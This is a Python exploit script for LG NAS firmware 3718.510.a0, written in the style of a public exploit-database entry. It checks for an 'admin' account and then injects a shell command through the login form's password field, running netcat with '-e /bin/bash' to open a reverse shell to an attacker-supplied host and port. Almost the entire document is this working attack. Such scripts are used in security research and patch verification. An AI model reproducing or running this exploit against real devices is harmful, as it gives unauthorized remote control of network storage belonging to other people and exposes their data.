# LG NAS 3718.510.a0 - Remote Command Execution
# Author: @0x616163
# Date: 2018-07-29
# Credits: https://www.vpnmentor.com/blog/critical-vulnerability-found-majority-lg-nas-devices/
# CVE: N/A
# Firmware Version: 3718.510.a0

#!/usr/bin/env python

import sys
import argparse
import requests
from collections import OrderedDict

def checkUser(target):
	# Exploiting this vulnerability requires a valid user account
	# on the target NAS otherwise the vulnerable code is not executed
	parameters = OrderedDict([('op_mode', 'login'), ('id', 'admin'), ('password', 'pass'), ('mobile', 'false')])
	r = requests.post("http://" + target + ":8000/en/php/login_check.php", data=parameters)
	if r.text == "NG:WRONG PASSWORD\n":
		print "[*] Valid user found: admin"
		return 0
	elif r.text == "NG:NO USER\n":
		print "[*] User not found: admin"
		sys.exit(1)

def sendPayload(target,lhost,lport):
	print "[*] Sending payload.."
	try:
		parameters = OrderedDict([('op_mode', 'login'), ('id', 'admin'), ('password', 'pass;/usr/bin/nc ' + lhost + " " + lport + " " + '-e /bin/bash'), ('mobile', 'false')])
		r = requests.post("http://" + target + "/en/php/login_check.php", data=parameters,timeout=0.001)
	except requests.exceptions.ReadTimeout:
		print "[*] Payload sent. Exiting."
		sys.exit(0)

	return 0
def main():
	parser = argparse.ArgumentParser(add_help=True, description='LG NAS Unauthenticated Remote Code Execution')
	parser.add_argument('-t', action="store", dest='target', help='Target host or IP')
	parser.add_argument('-l', action="store", dest='lhost', help='Local host or IP')
	parser.add_argument('-p', action="store", dest='lport', help='Listening TCP port to connect back to')
	results = parser.parse_args()
	args = vars(results)
	if len(sys.argv) < 1:
		parser.print_help()
		sys.exit(1)
	else:
		if checkUser(args['target']) == 0:
			sendPayload(args['target'], args['lhost'],args['lport'])

main()
sys.exit(0)